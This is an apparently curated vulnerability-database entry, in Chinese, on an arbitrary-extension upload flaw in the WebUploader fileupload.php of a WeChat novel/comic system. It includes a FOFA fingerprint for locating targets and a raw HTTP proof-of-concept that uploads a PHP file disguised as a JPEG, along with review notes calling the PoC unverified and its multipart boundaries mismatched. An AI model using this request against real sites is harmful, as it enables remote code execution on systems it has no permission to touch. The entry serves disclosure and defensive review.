---
source: "wy876 漏洞文库"
title: "微信公众号小说漫画系统内置WebUploader fileupload.php任意后缀上传"
product: "微信公众号小说漫画系统内置WebUploader"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "WebUploader0.1.5目录不等于系统版本，PHP执行配置"
prerequisites: "带PHPSESSID/uloginid，匿名未证"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ogfflvncv70d9ms4"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9F/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9Ffileupload.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "/Public/home/mhjs/jquery.js"
id: "vw-6040666883d2043c0f12ae89"
entity_id: "ve-6040666883d2043c0f12ae89"
schema_version: "1"
---

# 微信公众号小说漫画系统内置WebUploader fileupload.php任意后缀上传

## 条目说明

- 对象与具体问题：微信公众号小说漫画系统内置WebUploader；fileupload.php任意后缀上传
- 版本、配置及部署条件：WebUploader0.1.5目录不等于系统版本，PHP执行配置
- 认证与权限前提：带PHPSESSID/uloginid，匿名未证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Type boundary AW4...与正文03r...不同，明确multipart不可解析，优先修转存
- phpinfo上传需落盘/执行证明，当前只有路径无响应；文件持久无清理
- 也不能把嵌入示例端点缺陷泛化所有WebUploader部署
- 补发行方/服务器示例代码来源、修复版本

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
微信公众号小说漫画系统前台任意文件写入漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## 二、影响版本
+ 微信公众号小说漫画系统

## 三、资产测绘
+ fofa`"/Public/home/mhjs/jquery.js"`
+ 特征


## 四、漏洞复现
```http
POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAW4kl2MUmkWNAgBW
Cookie: PHPSESSID=b************************5; curIndex=3; uloginid=586639
Host: 
Origin: http://127.0.0.1
Pragma: no-cache
Referer: http://127.0.0.1/Public/webuploader/0.1.5/server/fileupload.php
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```

> 请求长度说明：原资料 Content-Length 为 197；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```java
/Public/webuploader/0.1.5/server/upload/1.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ogfflvncv70d9ms4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
